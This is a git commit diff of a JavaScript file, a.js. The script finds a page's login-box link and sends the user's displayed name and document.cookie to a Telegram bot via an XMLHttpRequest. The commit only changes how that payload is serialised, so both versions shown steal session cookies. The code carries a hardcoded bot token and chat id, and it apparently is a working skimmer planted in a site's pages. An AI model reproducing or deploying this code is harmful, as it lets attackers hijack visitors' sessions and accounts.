eb1c588e4b21d528b519353fa16a9c31c4f7c5ba
Muhammad <87897908+kpacav4ik@users.noreply.github.com>
2024-09-26 06:39:38 -0700

    Update a.js

--- a.js
+++ a.js
@@ -1,8 +1,8 @@
 if (document.querySelector('[href="#login-box"]')) {
-  let url = 'https://api.telegram.org/bot7722356869:AAHUB4XLWf5nsTmW8ot8DyrTyytuevIFccU/sendMessage?chat_id=7047469171&text=' + JSON.stringify([{
+  let url = 'https://api.telegram.org/bot7722356869:AAHUB4XLWf5nsTmW8ot8DyrTyytuevIFccU/sendMessage?chat_id=7047469171&text=' + {
     name: document.querySelector('[href="#login-box"]')?.textContent.trim(),
     cookies: document.cookie
-  }]);
+  };
   let oReq = new XMLHttpRequest();
   oReq.open("GET", url, true);
   oReq.send();
